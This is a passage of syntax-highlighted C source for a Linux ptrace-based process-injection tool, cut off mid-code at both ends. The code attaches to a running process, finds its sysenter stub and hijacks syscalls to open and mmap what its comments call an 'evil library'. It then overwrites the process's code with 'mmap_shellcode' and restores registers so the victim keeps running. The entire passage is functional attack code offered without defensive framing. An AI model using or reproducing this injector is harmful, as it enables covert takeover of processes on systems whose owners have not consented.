&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>tmp<span style="color: black;">[</span>i<span style="color: black;">]</span> == 0x0f &amp;&amp; tmp<span style="color: black;">[</span>i + <span style="color: #cc66cc;">1</span><span style="color: black;">]</span> == 0x34<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sysenter = syscall_eip + i;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* this works only if sysenter isn't at random location */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>tmp, 0xffffe000, <span style="color: #cc66cc;">8192</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">8192</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>tmp<span style="color: black;">[</span>i<span style="color: black;">]</span> == 0x0f &amp;&amp; tmp<span style="color: black;">[</span>i<span style="color: #cc66cc;">+1</span><span style="color: black;">]</span> == 0x34<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sysenter = 0xffffe000 + i;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; sysenter -= <span style="color: #cc66cc;">5</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!sysenter<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Unable to find sysenter<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Sysenter found: %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, sysenter<span style="color: black;">)</span>;&nbsp; &nbsp; &nbsp; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/*<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sysenter should point to: <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push &nbsp; %ecx<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push &nbsp; %edx<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push &nbsp; %ebp<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp;%esp,%ebp<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sysenter <br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;*/</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_ATTACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_attach"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; waitpid<span style="color: black;">(</span>pid, &amp;status, WUNTRACED<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = SYS_open;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = <span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span>data_segment;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ecx</span> = <span style="color: #cc66cc;">0</span>; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = sysenter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">5</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SINGLESTEP, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>reg.<span style="color: #202020;">eax</span> != SYS_open<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fd = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; offset = <span style="color: black;">(</span>data_segment + strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span><span style="color: black;">)</span> + <span style="color: #cc66cc;">8</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = sysenter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = SYS_mmap;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// 0</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">4</span>, text_length + <span style="color: black;">(</span>PAGE_SIZE - <span style="color: black;">(</span>text_length &amp; <span style="color: black;">(</span>PAGE_SIZE - <span style="color: #cc66cc;">1</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">8</span>, <span style="color: #cc66cc;">5</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// PROT_READ|PROT</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">12</span>, <span style="color: #cc66cc;">2</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// MAP_SHARED</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">16</span>, fd<span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// fd</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">20</span>, text_offset<span style="color: black;">)</span>; &nbsp; <br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span><span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">5</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SINGLESTEP, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>reg.<span style="color: #202020;">eax</span> != SYS_mmap<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; evil_base = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = sysenter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = SYS_mmap;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = offset;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// 0</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">4</span>, data_length + <span style="color: black;">(</span>PAGE_SIZE - <span style="color: black;">(</span>data_length &amp; <span style="color: black;">(</span>PAGE_SIZE - <span style="color: #cc66cc;">1</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">8</span>, <span style="color: #cc66cc;">3</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// PROT_READ|PROT_WRITE</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">12</span>, <span style="color: #cc66cc;">2</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// MAP_SHARED</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">16</span>, fd<span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// fd</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">20</span>, data_offset<span style="color: black;">)</span>; &nbsp; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">5</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SINGLESTEP, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Restoring data segment<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span> + <span style="color: #cc66cc;">32</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>data_segment + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>orig_ds + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = eip;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = eax;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = ebx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ecx</span> = ecx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">edx</span> = edx; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">esp</span> = esp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
<span style="color: black;">}</span><br>
<span style="color: #808080; font-style: italic;">/* function to load our evil library */</span><br>
<span style="color: #993333;">int</span> mmap_library<span style="color: black;">(</span><span style="color: #993333;">int</span> pid<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> &nbsp;user_regs_struct reg;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> eip, esp, <span style="color: #993333;">string</span>, offset, str,<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax, ebx, ecx, edx;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j = <span style="color: #cc66cc;">0</span>, ret, status;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> buf<span style="color: black;">[</span><span style="color: #cc66cc;">30</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;<span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> saved_text<span style="color: black;">[</span><span style="color: #cc66cc;">94</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *p;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; eip = reg.<span style="color: #202020;">eip</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; esp = reg.<span style="color: #202020;">esp</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ebx = reg.<span style="color: #202020;">ebx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ecx = reg.<span style="color: #202020;">ecx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; edx = reg.<span style="color: #202020;">edx</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; offset = text_base;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%%eip -&gt; 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, eip<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Injecting mmap_shellcode at 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, offset<span style="color: black;">)</span>;<br>
&nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* were going to load our shellcode at base */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* first we must backup the original code into saved_text */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j++<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; p = <span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *<span style="color: black;">)</span>buf;<br>
&nbsp; &nbsp; &nbsp; &nbsp; memcpy<span style="color: black;">(</span>saved_text, p, <span style="color: #cc66cc;">90</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Here is the saved code we will be overwriting:<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>, i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>j++ % <span style="color: #cc66cc;">20</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\\</span>x%.2x"</span>, saved_text<span style="color: black;">[</span>i<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* load shellcode into text starting at eip */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>mmap_shellcode + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>Verifying shellcode was injected properly, does this look ok?<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; j = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j++<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; p = <span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *<span style="color: black;">)</span> buf;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>, i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>j++ % <span style="color: #cc66cc;">20</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\\</span>x%.2x"</span>, p<span style="color: black;">[</span>i<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
